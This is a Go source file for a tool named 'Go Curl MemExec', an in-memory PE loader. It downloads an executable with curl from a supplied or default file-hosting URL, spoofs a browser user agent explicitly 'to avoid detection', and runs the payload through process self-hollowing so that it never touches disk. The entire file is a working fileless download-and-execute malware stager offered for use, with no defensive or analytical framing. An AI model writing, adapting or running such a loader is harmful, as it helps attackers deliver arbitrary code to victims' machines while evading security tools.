package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"

	runpe "runpe/gorunpe"
)

const (
	// Default URL to download from if none provided
	defaultDownloadURL = "https://tmpfiles.org/"
	
	// Project information
	projectName = "Go Curl MemExec"
	version     = "1.0.0"
)

func main() {
	fmt.Printf("%s v%s - In-Memory PE File Execution\n", projectName, version)
	
	// Determine downloadURL based on command-line arguments
	var downloadURL string
	if len(os.Args) < 2 {
		// No command-line argument for URL, use the hardcoded default
		downloadURL = defaultDownloadURL
		fmt.Printf("No download URL provided via command line. Using default: %s\n", defaultDownloadURL)
	} else {
		// Use the provided URL
		downloadURL = os.Args[1]
		// Basic URL validation
		if !strings.HasPrefix(downloadURL, "http://") && !strings.HasPrefix(downloadURL, "https://") {
			log.Fatalf("Invalid URL format. Please provide a URL starting with http:// or https://")
		}
	}

	// Download the PE file directly to memory using curl
	// CRITICAL: Using -o - to output to stdout ensures the file NEVER touches disk
	fmt.Printf("Downloading executable from: %s directly to memory...\n", downloadURL)
	
	// Configure curl to download directly to stdout (-o -), silently (-s), follow redirects (-L)
	// and use a standard user agent to avoid detection
	cmd := exec.Command(
		"curl", 
		"-s",                // Silent mode
		"-L",                // Follow redirects
		"-o", "-",           // Output to stdout (memory)
		"-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
		downloadURL,
	)
	
	// Execute curl and capture the output directly into memory
	payload, err := cmd.Output()
	if err != nil {
		log.Fatalf("Failed to download payload: %v", err)
	}
	
	// Validate we actually got data
	if len(payload) < 512 {
		log.Fatalf("Downloaded payload is too small (%d bytes). Not a valid PE file.", len(payload))
	}
	
	fmt.Printf("Downloaded %d bytes successfully into memory\n", len(payload))
	
	// CRITICAL: At this point, the payload exists ONLY in memory
	// No temporary files were created during the download process
	
	// Execute the payload in memory using process self-hollowing
	fmt.Println("Executing payload in memory without touching disk...")
	err = runpe.ExecuteInMemory(payload)
	if err != nil {
		log.Fatalf("In-memory execution failed: %v", err)
	}
	
	// If the program reaches here, it means the payload either:
	// 1) Executed but returned control
	// 2) Failed to fully hijack the process
	// Most successful executions will never reach this point as the original process is replaced
	fmt.Println("Self-hollowing process completed. If you see this message, the payload may have finished executing or failed to take control.")
}